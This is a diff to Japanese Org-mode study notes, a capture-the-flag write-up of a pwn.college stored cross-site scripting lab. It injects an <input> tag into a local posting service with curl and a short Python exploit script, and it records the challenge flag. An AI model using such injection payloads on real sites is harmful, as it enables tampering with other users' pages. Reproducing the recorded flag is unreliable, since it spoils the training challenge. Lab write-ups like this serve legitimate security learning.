@@ -248,3 +248,101 @@ try:
 except:
     print("Error")
 #+end_src
+* Cross Site Scripting [1/7]
+** DONE XSS 1
+CLOSED: [2026-06-17 水 09:28]
+:LOGBOOK:
+- Note taken on [2026-06-17 水 10:06] \\
+  #+begin_comment
+  反射型と蓄積型
+
+  なにがいけなかったのか
+  #+end_comment
+- CLOSING NOTE [2026-06-17 水 09:28] \\
+  #+begin_comment
+  ~pwn.college{k-6PQZhZ-9UkXJgtutEhoTH5Zt5.dVzN1YDL2AjNyMzW}~
+  #+end_comment
+:END:
+あなたには、被害者ユーザーがウェブサーバーを訪れるのを模擬したプログラムがあります。
+
+この問題では、 ~/challenge/victim~ で XSS が行われたか判定し、フラグが出力される。
+
+はじめに、 ~/challenge/server~ を起動させてから、 ~/challenge/victim~ を実行してみると以下のような出力が得られる。
+
+#+begin_example
+Visiting http://challenge.localhost:80/...
+You did not inject an <input> textbox...
+#+end_example
+
+ここで、 ~/challenge/victim~ の内容を確認する。
+
+ページ要素から正規表現で ~<input>~ の個数を取得し、個数が 3 以上ならフラグが出力されるようになっている。
+
+#+begin_src python :eval no
+num_inputs = len(re.findall(r"<input[^<]*>", requests.get(challenge_url, timeout=1).text))
+if num_inputs <= 2:
+    print("You did not inject an <input> textbox...")
+else:
+    print("You got it! Here is your flag:")
+    print(flag)
+#+end_src
+
+よって、 ~/challenge/server~ より、 ~<input>~ はすでに 2 つあるので、以下のようなリクエストを行ってインジェクトする。
+
+#+begin_src shell
+curl -X POST -d "content=<input>" http://challenge.localhost
+#+end_src
+
+このあとに ~/challenge/victim~ を実行するとフラグが出力される。
+
+なお、このような方法だと以下のような出力がなされて、インジェクションされているか確認ができない。
+
+#+begin_example
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
+#+end_example
+
+そこで、以下のようなスクリプトを組むと、内容を確認できる。
+
+#+NAME: exploit.py
+#+begin_src python :eval no
+#!/usr/bin/env python
+
+import requests
+
+url = "http://challenge.localhost"
+
+session = requests.Session()
+
+payload = {
+    "content": "<input>",
+}
+
+try:
+    response = session.post(url, data=payload)
+    print(response.text)
+except:
+    print("Error")
+#+end_src
+
+#+begin_src shell
+python3 exploit.py
+#+end_src
+
+#+begin_example
+<html><body>
+Welcome to pwnpost, the anonymous posting service. Post away!
+<form method=post>Post:<input type=text name=content><input type=submit value=Submit></form>
+<hr>First Post!
+<hr><input>
+</body></html>
+#+end_example
+** TODO XSS 2
+** TODO XSS 3
+** TODO XSS 4
+** TODO XSS 5
+** TODO XSS 6
+** TODO XSS 7
